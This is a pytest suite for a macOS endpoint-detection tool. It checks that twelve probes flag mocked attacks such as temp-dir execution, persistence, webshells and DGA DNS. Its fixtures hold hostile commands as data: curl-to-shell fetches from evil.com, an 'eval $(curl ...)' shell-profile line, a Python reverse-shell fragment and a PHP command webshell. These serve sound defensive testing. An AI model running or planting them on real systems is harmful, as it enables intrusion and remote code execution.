"""12-Scenario Attack Surface Validation Suite.

Maps to the 12 test scenarios defined in:
    docs/eoa/mac_entry_surface_coverage_matrix.md (lines 491-514)

Each test injects mock data through the probe's expected interface
(shared_data, psutil mock, etc.) and verifies the probe fires with
correct event_type, severity, and MITRE techniques.

Coverage:
    Surface 1-3: Execution (ProcAgent V3)
    Surface 4-6: Persistence (PersistenceGuard V2)
    Surface 7-8: Filesystem (FIMAgent V2)
    Surface 9-10: DNS (DNSAgent V2)
    Surface 11: Peripheral (PeripheralAgent V2)
    Surface 12: Auth (AuthGuard V2.1)
"""

from __future__ import annotations

import stat
import time
from datetime import datetime, timezone
from unittest.mock import MagicMock, patch

import psutil as real_psutil
import pytest

from amoskys.agents.common.probes import ProbeContext, Severity


# ============================================================================
# HELPERS
# ============================================================================


def _ctx(device_id: str = "test-host", agent_name: str = "test-agent", **shared):
    """Build a ProbeContext with shared_data."""
    return ProbeContext(
        device_id=device_id,
        agent_name=agent_name,
        shared_data=shared,
    )


def _now_ns() -> int:
    return int(time.time() * 1e9)


# ============================================================================
# SCENARIO 1 — Binary executed from /tmp  (ProcAgent → binary_from_temp)
# ============================================================================


class TestScenario01_BinaryFromTemp:
    """An attacker drops a binary in /tmp and executes it."""

    def test_binary_from_tmp_fires(self):
        from amoskys.agents.proc.probes import BinaryFromTempProbe

        probe = BinaryFromTempProbe()
        context = _ctx(agent_name="proc_agent_v3")

        mock_proc = MagicMock()
        mock_proc.info = {
            "pid": 7777,
            "name": "payload",
            "exe": "/tmp/payload",
            "cmdline": ["/tmp/payload", "--connect"],
            "username": "attacker",
            "create_time": 1700000000.0,
        }

        with patch("amoskys.agents.proc.probes.psutil") as mp, \
             patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", True):
            mp.process_iter.return_value = [mock_proc]
            mp.NoSuchProcess = real_psutil.NoSuchProcess
            mp.AccessDenied = real_psutil.AccessDenied
            events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "execution_from_temp"
        assert ev.severity == Severity.HIGH
        assert "T1204" in ev.mitre_techniques
        assert ev.data["exe"] == "/tmp/payload"
        assert "process_guid" in ev.data


# ============================================================================
# SCENARIO 2 — curl | sh pattern  (ProcAgent → lolbin_execution)
# ============================================================================


class TestScenario02_CurlPipeShell:
    """Attacker runs 'curl http://evil.com/payload.sh | sh'."""

    def test_lolbin_curl_with_suspicious_cmdline(self):
        from amoskys.agents.proc.probes import LOLBinExecutionProbe

        probe = LOLBinExecutionProbe()
        context = _ctx(agent_name="proc_agent_v3")

        mock_proc = MagicMock()
        mock_proc.info = {
            "pid": 8001,
            "name": "curl",
            "exe": "/usr/bin/curl",
            "cmdline": ["curl", "-s", "http://evil.com/payload.sh"],
            "username": "attacker",
            "ppid": 1,
            "create_time": 1700000000.0,
        }

        with patch("amoskys.agents.proc.probes.psutil") as mp, \
             patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", True):
            mp.process_iter.return_value = [mock_proc]
            mp.NoSuchProcess = real_psutil.NoSuchProcess
            mp.AccessDenied = real_psutil.AccessDenied
            events = probe.scan(context)

        # curl is a known LOLBin — should fire
        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "lolbin_execution"
        assert "T1218" in ev.mitre_techniques
        assert ev.data["binary"] == "curl"
        assert "process_guid" in ev.data


# ============================================================================
# SCENARIO 3 — Python reverse shell  (ProcAgent → script_interpreter)
# ============================================================================


class TestScenario03_PythonReverseShell:
    """Attacker spawns: python3 -c 'import socket,subprocess,os; ...'"""

    def test_script_interpreter_detects_reverse_shell(self):
        from amoskys.agents.proc.probes import ScriptInterpreterProbe

        probe = ScriptInterpreterProbe()
        context = _ctx(agent_name="proc_agent_v3")

        mock_proc = MagicMock()
        mock_proc.info = {
            "pid": 9001,
            "name": "python3",
            "cmdline": [
                "python3", "-c",
                "import socket,subprocess,os; s=socket.socket(); s.connect(('10.0.0.1',4444))",
            ],
            "username": "attacker",
            "create_time": 1700000000.0,
        }

        with patch("amoskys.agents.proc.probes.psutil") as mp, \
             patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", True):
            mp.process_iter.return_value = [mock_proc]
            mp.NoSuchProcess = real_psutil.NoSuchProcess
            mp.AccessDenied = real_psutil.AccessDenied
            events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "suspicious_script_execution"
        assert ev.severity == Severity.HIGH
        assert "T1059" in ev.mitre_techniques
        assert ev.data["interpreter"] == "python3"
        assert "process_guid" in ev.data


# ============================================================================
# SCENARIO 4 — LaunchAgent plist created  (PersistenceGuard → launchd)
# ============================================================================


class TestScenario04_LaunchAgentPersistence:
    """Attacker creates a malicious LaunchAgent plist."""

    def test_launchd_persistence_created(self):
        from amoskys.agents.persistence.probes import (
            LaunchAgentDaemonProbe,
            PersistenceChange,
            PersistenceChangeType,
            PersistenceEntry,
        )

        probe = LaunchAgentDaemonProbe()
        now = _now_ns()

        evil_entry = PersistenceEntry(
            id="com.evil.backdoor",
            mechanism_type="LAUNCH_AGENT",
            user="alice",
            path="/Users/alice/Library/LaunchAgents/com.evil.backdoor.plist",
            command="/bin/bash",
            args="-c curl http://evil.com/payload | sh",
            enabled=True,
            hash="a" * 64,
            metadata={},
            last_seen_ns=now,
        )

        change = PersistenceChange(
            entry_id="com.evil.backdoor",
            mechanism_type="LAUNCH_AGENT",
            change_type=PersistenceChangeType.CREATED,
            old_entry=None,
            new_entry=evil_entry,
            timestamp_ns=now,
        )

        context = _ctx(
            agent_name="persistence_agent_v2",
            persistence_changes=[change],
        )
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert "launchd" in ev.event_type.lower() or "persistence" in ev.event_type.lower()
        assert ev.severity in (Severity.HIGH, Severity.CRITICAL)
        assert any("T1543" in t for t in ev.mitre_techniques)


# ============================================================================
# SCENARIO 5 — Malicious zshrc modification  (PersistenceGuard → shell_profile)
# ============================================================================


class TestScenario05_ShellProfileHijack:
    """Attacker appends 'eval $(curl evil.com/c2)' to .zshrc."""

    def test_shell_profile_hijack_fires(self):
        from amoskys.agents.persistence.probes import (
            PersistenceChange,
            PersistenceChangeType,
            PersistenceEntry,
            ShellProfileHijackProbe,
        )

        probe = ShellProfileHijackProbe()
        now = _now_ns()

        old_entry = PersistenceEntry(
            id="/Users/alice/.zshrc",
            mechanism_type="SHELL_PROFILE",
            user="alice",
            path="/Users/alice/.zshrc",
            command="# normal zshrc content",
            args="",
            enabled=True,
            hash="b" * 64,
            metadata={},
            last_seen_ns=now - 1_000_000_000,
        )

        new_entry = PersistenceEntry(
            id="/Users/alice/.zshrc",
            mechanism_type="SHELL_PROFILE",
            user="alice",
            path="/Users/alice/.zshrc",
            command="eval $(curl http://evil.com/c2)",
            args="",
            enabled=True,
            hash="c" * 64,
            metadata={},
            last_seen_ns=now,
        )

        change = PersistenceChange(
            entry_id="/Users/alice/.zshrc",
            mechanism_type="SHELL_PROFILE",
            change_type=PersistenceChangeType.MODIFIED,
            old_entry=old_entry,
            new_entry=new_entry,
            timestamp_ns=now,
        )

        context = _ctx(
            agent_name="persistence_agent_v2",
            persistence_changes=[change],
        )
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert "shell" in ev.event_type.lower() or "profile" in ev.event_type.lower()
        assert ev.severity in (Severity.HIGH, Severity.CRITICAL)
        assert any("T1546" in t or "T1037" in t for t in ev.mitre_techniques)


# ============================================================================
# SCENARIO 6 — New cron entry  (PersistenceGuard → cron_persistence)
# ============================================================================


class TestScenario06_CronPersistence:
    """Attacker adds @reboot cron entry with reverse shell."""

    def test_cron_persistence_created(self):
        from amoskys.agents.persistence.probes import (
            CronJobPersistenceProbe,
            PersistenceChange,
            PersistenceChangeType,
            PersistenceEntry,
        )

        probe = CronJobPersistenceProbe()
        now = _now_ns()

        cron_entry = PersistenceEntry(
            id="cron:alice:@reboot /tmp/backdoor",
            mechanism_type="CRON_JOB",
            user="alice",
            path="/var/spool/cron/crontabs/alice",
            command="/tmp/backdoor",
            args="@reboot /tmp/backdoor",
            enabled=True,
            hash="d" * 64,
            metadata={"schedule": "@reboot"},
            last_seen_ns=now,
        )

        change = PersistenceChange(
            entry_id="cron:alice:@reboot /tmp/backdoor",
            mechanism_type="CRON_JOB",
            change_type=PersistenceChangeType.CREATED,
            old_entry=None,
            new_entry=cron_entry,
            timestamp_ns=now,
        )

        context = _ctx(
            agent_name="persistence_agent_v2",
            persistence_changes=[change],
        )
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert "cron" in ev.event_type.lower()
        assert ev.severity in (Severity.HIGH, Severity.CRITICAL)
        assert any("T1053" in t for t in ev.mitre_techniques)


# ============================================================================
# SCENARIO 7 — Webshell dropped in web root  (FIMAgent → webshell_drop)
# ============================================================================


class TestScenario07_WebshellDrop:
    """Attacker drops a PHP webshell in /var/www/html/."""

    def test_webshell_detected(self, tmp_path):
        from amoskys.agents.fim.probes import (
            ChangeType,
            FileChange,
            FileState,
            WebShellDropProbe,
        )

        # Create temp webshell file for content scanning
        webshell = tmp_path / "cmd.php"
        webshell.write_bytes(b"<?php system($_REQUEST['cmd']); ?>")

        probe = WebShellDropProbe()

        new_state = FileState(
            path=str(webshell),
            sha256="e" * 64,
            size=34,
            mode=0o100644,
            uid=0,
            gid=0,
            mtime_ns=_now_ns(),
            is_dir=False,
            is_symlink=False,
        )

        change = FileChange(
            path="/var/www/html/cmd.php",  # Must be in WEB_ROOTS
            change_type=ChangeType.CREATED,
            old_state=None,
            new_state=new_state,
            timestamp_ns=_now_ns(),
        )

        context = _ctx(agent_name="fim_agent_v2", file_changes=[change])

        # Patch _check_webshell_patterns to use our temp file path
        with patch.object(probe, "_check_webshell_patterns") as mock_check:
            mock_check.return_value = (True, ["system($_REQUEST)"])
            events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "webshell_detected"
        assert ev.severity == Severity.CRITICAL
        assert "T1505.003" in ev.mitre_techniques


# ============================================================================
# SCENARIO 8 — chmod 777 on /etc/passwd  (FIMAgent → world_writable_sensitive)
# ============================================================================


class TestScenario08_WorldWritable:
    """Attacker runs 'chmod 777 /etc/passwd'."""

    def test_world_writable_sensitive_fires(self):
        from amoskys.agents.fim.probes import (
            ChangeType,
            FileChange,
            FileState,
            WorldWritableSensitiveProbe,
        )

        probe = WorldWritableSensitiveProbe()

        old_state = FileState(
            path="/etc/passwd",
            sha256="f" * 64,
            size=2048,
            mode=stat.S_IFREG | 0o644,  # rw-r--r--
            uid=0,
            gid=0,
            mtime_ns=_now_ns() - 1_000_000_000,
            is_dir=False,
            is_symlink=False,
        )

        new_state = FileState(
            path="/etc/passwd",
            sha256="f" * 64,
            size=2048,
            mode=stat.S_IFREG | 0o777,  # rwxrwxrwx (world-writable!)
            uid=0,
            gid=0,
            mtime_ns=_now_ns(),
            is_dir=False,
            is_symlink=False,
        )

        change = FileChange(
            path="/etc/passwd",
            change_type=ChangeType.PERM_CHANGED,
            old_state=old_state,
            new_state=new_state,
            timestamp_ns=_now_ns(),
        )

        context = _ctx(agent_name="fim_agent_v2", file_changes=[change])
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "world_writable_sensitive"
        assert ev.severity == Severity.HIGH
        assert "T1565" in ev.mitre_techniques


# ============================================================================
# SCENARIO 9 — NXDOMAIN burst  (DNSAgent → nxdomain_burst)
# ============================================================================


class TestScenario09_NXDomainBurst:
    """Malware probes 50 random subdomains → all return NXDOMAIN."""

    def test_nxdomain_burst_fires(self):
        from amoskys.agents.dns.probes import DNSQuery, NXDomainBurstProbe

        probe = NXDomainBurstProbe()
        now = datetime.now(timezone.utc)

        # Generate 50 NXDOMAIN queries in rapid succession
        queries = [
            DNSQuery(
                timestamp=now,
                domain=f"xkq{i:03d}rand.evil-c2.com",
                query_type="A",
                response_code="NXDOMAIN",
                process_name="malware",
                process_pid=6666,
            )
            for i in range(50)
        ]

        context = _ctx(agent_name="dns_agent_v2", dns_queries=queries)
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert "nxdomain" in ev.event_type.lower()
        assert ev.severity in (Severity.MEDIUM, Severity.HIGH)


# ============================================================================
# SCENARIO 10 — High-entropy DGA domains  (DNSAgent → dga_score)
# ============================================================================


class TestScenario10_DGADomains:
    """Malware resolves DGA-generated domains with high entropy."""

    def test_dga_score_fires(self):
        from amoskys.agents.dns.probes import DGAScoreProbe, DNSQuery

        probe = DGAScoreProbe()
        now = datetime.now(timezone.utc)

        # Classic DGA pattern: random consonants, no vowels, high entropy
        dga_domains = [
            "xkrn7f9q2bpthz.com",
            "qjzwxnm5vc8kd.net",
            "plkrhbgfmzxcn.org",
        ]

        queries = [
            DNSQuery(
                timestamp=now,
                domain=domain,
                query_type="A",
                response_code="NOERROR",
                process_name="svchost",
                process_pid=1234,
            )
            for domain in dga_domains
        ]

        context = _ctx(agent_name="dns_agent_v2", dns_queries=queries)
        events = probe.scan(context)

        # At least one DGA domain should be flagged
        assert len(events) >= 1
        ev = events[0]
        assert "dga" in ev.event_type.lower()
        assert ev.severity in (Severity.MEDIUM, Severity.HIGH)
        assert any("T1568" in t for t in ev.mitre_techniques)


# ============================================================================
# SCENARIO 11 — USB storage inserted  (PeripheralAgent → usb_storage)
# ============================================================================


class TestScenario11_USBStorage:
    """Attacker inserts a USB flash drive."""

    def test_usb_storage_detected(self):
        from amoskys.agents.peripheral.probes import USBDevice, USBStorageProbe

        probe = USBStorageProbe()

        flash_drive = USBDevice(
            device_id="usb-sandisk-cruzer-001",
            name="SanDisk Cruzer Glide 64GB",
            vendor_id="0x0781",
            product_id="0x5567",
            serial_number="ABC123456",
            manufacturer="SanDisk",
            location_id="0x14100000",
            device_speed="USB 3.0",
            device_class="08",  # Mass Storage
        )

        context = _ctx(
            agent_name="peripheral_agent_v2",
            usb_devices=[flash_drive],
        )
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert "storage" in ev.event_type.lower()
        assert ev.severity in (Severity.MEDIUM, Severity.HIGH)
        assert any("T1091" in t or "T1052" in t for t in ev.mitre_techniques)
        assert ev.data["name"] == "SanDisk Cruzer Glide 64GB"


# ============================================================================
# SCENARIO 12 — sudo elevation  (AuthGuard → sudo_elevation)
# ============================================================================


class TestScenario12_SudoElevation:
    """User runs 'sudo ls' — first-time sudo for this user."""

    def test_sudo_elevation_first_use(self):
        from amoskys.agents.auth.probes import AuthEvent, SudoElevationProbe

        probe = SudoElevationProbe()
        now = _now_ns()

        auth_events = [
            AuthEvent(
                timestamp_ns=now,
                event_type="SUDO_EXEC",
                status="SUCCESS",
                username="alice",
                command="ls",
                tty="ttys001",
            ),
        ]

        context = _ctx(
            agent_name="auth_guard_v2",
            auth_events=auth_events,
        )
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert "sudo" in ev.event_type.lower()
        assert ev.severity in (Severity.LOW, Severity.MEDIUM, Severity.HIGH)
        assert any("T1548" in t for t in ev.mitre_techniques)


# ============================================================================
# SUMMARY — Verify all 12 scenarios are present
# ============================================================================


class TestScenarioInventory:
    """Meta-test: verify the test suite covers all 12 documented scenarios."""

    EXPECTED_SCENARIOS = [
        "TestScenario01_BinaryFromTemp",
        "TestScenario02_CurlPipeShell",
        "TestScenario03_PythonReverseShell",
        "TestScenario04_LaunchAgentPersistence",
        "TestScenario05_ShellProfileHijack",
        "TestScenario06_CronPersistence",
        "TestScenario07_WebshellDrop",
        "TestScenario08_WorldWritable",
        "TestScenario09_NXDomainBurst",
        "TestScenario10_DGADomains",
        "TestScenario11_USBStorage",
        "TestScenario12_SudoElevation",
    ]

    def test_all_12_scenarios_defined(self):
        """All 12 attack surface scenarios have test classes."""
        import sys

        module = sys.modules[__name__]
        for name in self.EXPECTED_SCENARIOS:
            assert hasattr(module, name), f"Missing test class: {name}"
